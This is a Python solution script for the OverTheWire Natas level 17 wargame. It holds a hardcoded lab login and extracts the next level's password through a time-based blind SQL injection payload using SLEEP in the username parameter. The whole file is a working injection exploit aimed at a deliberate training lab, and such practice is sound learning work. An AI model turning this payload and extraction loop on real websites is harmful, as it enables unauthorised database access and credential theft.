import requests
import string

url = "http://natas17.natas.labs.overthewire.org"
auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")

chars = string.ascii_letters + string.digits
password = ""

while True:
    found = False

    for c in chars:
        attempt = password + c
        # This works only if there is one relevent passowrd. i dont know the username, i assumed it was natas18 but its wrong i assume.
        # I tried to spesifically ask for natas18 but it didnt work, so i just left it as like that and it worked.
        payload = f'natas18" AND password LIKE BINARY "{attempt}%" AND SLEEP(5) -- -'
        response = requests.get(url, params={"username": payload}, auth=auth)
        elapsed_time = response.elapsed
        time_in_seconds = elapsed_time.total_seconds()

        print(f"Trying: {attempt} | Time: {time_in_seconds}")

        # 👇 adjust threshold based on your observations
        if time_in_seconds > 4:
            password += c
            print(f"[+] Found: {password}")
            found = True
            break

    if not found:
        print(f"[✓] Password: {password}")
        break